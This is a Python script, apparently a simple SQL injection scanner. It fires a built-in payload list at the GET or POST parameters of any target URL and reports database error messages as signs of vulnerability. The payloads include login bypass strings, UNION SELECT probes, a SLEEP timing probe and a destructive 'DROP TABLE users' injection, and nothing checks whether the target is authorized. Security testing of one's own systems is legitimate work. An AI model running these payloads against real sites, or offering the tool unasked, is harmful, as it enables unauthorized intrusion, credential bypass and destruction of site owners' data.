#!/usr/bin/env python3
"""
Simple SQL Injection Tester
Test web applications for SQL injection vulnerabilities
"""

import requests
import argparse
import sys
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

class SQLiTester:
    # Common SQL injection payloads
    SQL_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
        "1'; DROP TABLE users--",
        "1'; SELECT SLEEP(5)--"
    ]

    # SQL error signatures
    SQL_ERRORS = [
        "sql syntax",
        "mysql_fetch",
        "mysql_num_rows",
        "mysql error",
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "odbc drivers error",
        "microsoft ole db provider for sql server",
        "microsoft odbc sql server driver",
        "incorrect syntax near",
        "unterminated string constant",
        "postgresql query failed",
        "pg_query() error",
        "pg_exec() error"
    ]

    def __init__(self, url, method='GET', data=None, verbose=False):
        self.url = url
        self.method = method.upper()
        self.data = data or {}
        self.verbose = verbose
        self.vulnerable_params = []

    def test_payload(self, param, payload):
        """Test a single payload on a parameter"""
        try:
            if self.method == 'GET':
                # Inject into GET parameter
                test_url = self.url
                parsed = urlparse(test_url)
                params = parse_qs(parsed.query)
                params[param] = [payload]
                query = urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

                response = requests.get(test_url, timeout=10)
            else:
                # Inject into POST data
                test_data = self.data.copy()
                test_data[param] = payload
                response = requests.post(self.url, data=test_data, timeout=10)

            # Check for SQL errors in response
            response_text = response.text.lower()
            for error_sig in self.SQL_ERRORS:
                if error_sig in response_text:
                    return True, error_sig

            return False, None

        except requests.exceptions.RequestException as e:
            if self.verbose:
                print(f"[-] Request error: {e}")
            return False, None

    def test_parameter(self, param):
        """Test all payloads on a specific parameter"""
        print(f"\n[*] Testing parameter: {param}")
        vulnerabilities = []

        for payload in self.SQL_PAYLOADS:
            if self.verbose:
                print(f"[*] Testing payload: {payload}")

            is_vuln, error_sig = self.test_payload(param, payload)

            if is_vuln:
                vuln_info = {
                    'param': param,
                    'payload': payload,
                    'error': error_sig
                }
                vulnerabilities.append(vuln_info)
                print(f"[+] VULNERABLE! Parameter: {param}")
                print(f"    Payload: {payload}")
                print(f"    Error signature: {error_sig}")

        return vulnerabilities

    def scan(self):
        """Scan all parameters for SQL injection"""
        print(f"[*] SQL Injection Scanner")
        print(f"[*] Target: {self.url}")
        print(f"[*] Method: {self.method}")
        print("-" * 60)

        all_vulnerabilities = []

        # Get parameters to test
        if self.method == 'GET':
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            param_names = list(params.keys())
        else:
            param_names = list(self.data.keys())

        if not param_names:
            print("[-] No parameters found to test")
            return []

        print(f"[*] Found {len(param_names)} parameter(s) to test")

        for param in param_names:
            vulns = self.test_parameter(param)
            all_vulnerabilities.extend(vulns)

        return all_vulnerabilities

    def print_summary(self, vulnerabilities):
        """Print scan summary"""
        print("\n" + "=" * 60)
        print("SCAN SUMMARY")
        print("=" * 60)

        if vulnerabilities:
            print(f"\n[!] Found {len(vulnerabilities)} potential SQL injection(s)!")
            unique_params = set(v['param'] for v in vulnerabilities)
            print(f"[!] Vulnerable parameters: {', '.join(unique_params)}")
        else:
            print("\n[+] No SQL injection vulnerabilities detected")

def main():
    parser = argparse.ArgumentParser(
        description='Simple SQL Injection Tester',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  Test GET parameters:
    %(prog)s -u "http://example.com/page.php?id=1&user=admin"

  Test POST parameters:
    %(prog)s -u "http://example.com/login.php" -m POST -d "username=admin&password=pass"

  Verbose mode:
    %(prog)s -u "http://example.com/page.php?id=1" -v
        '''
    )

    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'],
                        help='HTTP method (default: GET)')
    parser.add_argument('-d', '--data', help='POST data (format: key1=value1&key2=value2)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    # Parse POST data if provided
    post_data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                post_data[key] = value

    # Create tester
    tester = SQLiTester(
        url=args.url,
        method=args.method,
        data=post_data,
        verbose=args.verbose
    )

    try:
        vulnerabilities = tester.scan()
        tester.print_summary(vulnerabilities)

    except KeyboardInterrupt:
        print("\n\n[!] Scan interrupted by user")
        sys.exit(1)

if __name__ == "__main__":
    main()
